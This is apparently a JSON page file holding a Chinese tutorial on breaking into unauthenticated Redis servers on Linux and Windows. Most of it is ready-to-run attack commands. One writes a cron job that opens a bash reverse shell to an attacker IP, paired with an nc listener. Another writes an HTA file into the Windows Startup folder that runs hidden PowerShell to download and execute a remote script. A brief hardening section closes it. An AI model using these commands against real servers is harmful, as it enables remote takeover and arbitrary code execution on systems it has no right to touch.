{
  "name": "redis 入侵方法(linux/win)",
  "tagline": "redis漏洞 redis未授权访问 redis windows ",
  "body": "##参演演员\r\n    攻击者: 119.97.22.13\r\n    漏洞机: 180.33.212.87\r\n\r\n满足以下条件Redis实例存在此安全隐患\r\n\r\n    Redis使用root用户启动\r\n    Redis未设置密码或密码过于简单\r\n    Redis未重命名或禁用config, flushdb/flushall,[bg]save等命令\r\n加强Redis的安全性，提供以下攻击方法和安全规范。\r\n\r\n##攻击方法\r\n*重写authorized_keys文件入侵服务器方法略。*\r\n*利用web路径写webshell方法略。*\r\n###设置key：写入反弹shell语句到key,保持在redis最顶位\r\n    echo -e \"\\n\\n*/1 * * * * bash -i >& /dev/tcp/119.97.22.13/443 0>&1 \\n\\n\"|redis-cli -h 180.33.212.87 -x set 1\r\n###设置存储目录:写入计划任务\r\n    redis-cli -h 180.33.212.87 -x config set dir /var/spool/cron\r\n###设置存储文件名:\r\n    redis-cli -h 180.33.212.87 -x config set dbfilename root\r\n###保存到计划任务目录:\r\n    redis-cli -h 180.33.212.87 –x save\r\n###获取shell：\r\n    在攻击者主机内用nc监听\r\n    nc -l -v -p 443\r\n###windows可以设置启动项\r\n    cat hta-psh.txt\r\n    <scRipt language=\"VBscRipT\">CreateObject(\"WscrIpt.SheLL\").Run \"powershell -w hidden IEX (New-ObjEct System.Net.Webclient).DownloadString('http://119.97.22.13:8080/1.ps1')\"</scRipt>\r\n\r\n    cat hta-psh.txt |redis-cli -x -h 180.33.212.87 set a\r\n    redis-cli -h 180.33.212.87\r\n    config set dir \"c:\\\\ProgramData\\\\Microsoft\\\\Windows\\\\Start Menu\\\\Programs\\\\Startup\"\r\n    config set dbfilename \"1.hta\"\r\n    save\r\n    \r\n##漏洞修复建议：\r\n    1. 恢复Redis 默认配置(dbfilename dir)\r\n        config set dir /etc/redis/\r\n        config set dbfilename dump.rdb\r\n    2. 针对新上线Redis建议采用iptables限制、Redis认证限制\r\n        requirepass redispassword\r\n    3. 针对新上线Redis建议以低权限用户运行\r\n    4. 禁用或重命名危险命令\r\n        rename-command CONFIG CONFIG_b9fc8327c4dee7\r\n        rename-command SHUTDOWN SHUTDOWN_b9fc8327c4dee7\r\n        rename-command FLUSHDB \"\"\r\n        rename-command FLUSHALL \"\"",
  "note": "Don't delete this file! It's used internally to help with page regeneration."
}